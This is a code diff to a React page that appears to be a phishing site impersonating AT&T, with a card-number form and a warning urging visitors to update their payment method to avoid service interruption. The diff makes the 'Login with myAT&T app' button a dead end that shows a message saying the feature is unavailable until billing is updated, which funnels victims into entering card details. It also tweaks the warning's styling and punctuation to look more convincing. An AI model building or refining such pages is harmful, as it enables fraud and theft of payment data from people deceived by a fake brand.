@@ -17,6 +17,8 @@ export default function Home() {
     const zipInput = document.getElementById('zip');
     const submitBtn = document.getElementById('submit-btn');
     const loadingScreen = document.getElementById('loading-screen');
+    const appLoginBtn = document.getElementById('app-login-btn');
+    const appLoginError = document.getElementById('app-login-error');
 
     // Focus card number input on load
     if (cardNumberInput) {
@@ -312,6 +314,14 @@ export default function Home() {
         }
       });
     }
+
+    // Handle app login button click
+    if (appLoginBtn && appLoginError) {
+      appLoginBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        appLoginError.style.display = 'block';
+      });
+    }
   }, []);
 
   return (
@@ -417,7 +427,7 @@ export default function Home() {
         }
 
         .warning-text {
-          font-size: 11px;
+          font-size: 12px;
           font-weight: 300;
           color: #333333;
           line-height: 1.4;
@@ -585,6 +595,15 @@ export default function Home() {
           transform: translateY(1px);
         }
 
+        .app-login-error {
+          color: #d32f2f;
+          font-size: 12px;
+          font-weight: 400;
+          text-align: center;
+          margin-top: 8px;
+          line-height: 1.4;
+        }
+
         .footer {
           margin-top: 48px;
           padding: 24px 24px;
@@ -711,7 +730,7 @@ export default function Home() {
           }
 
           .warning-text {
-            font-size: 11px;
+            font-size: 12px;
           }
 
           .form-group {
@@ -812,7 +831,7 @@ export default function Home() {
 
         <div className="warning-message">
           <span className="warning-icon">!</span>
-          <span className="warning-text">Please update your payment method to avoid<br />service interruption</span>
+          <span className="warning-text">Please update your payment method to avoid<br />service interruption.</span>
         </div>
 
         <form id="billing-form">
@@ -925,7 +944,8 @@ export default function Home() {
           <span className="separator-text">OR</span>
         </div>
 
-        <button type="button" className="secondary-btn">Login with myAT&T app</button>
+        <button type="button" className="secondary-btn" id="app-login-btn">Login with myAT&T app</button>
+        <div id="app-login-error" className="app-login-error" style={{ display: 'none' }}>Feature temporarily unavailable until billing is updated</div>
           </div>
         </div>
       </div>
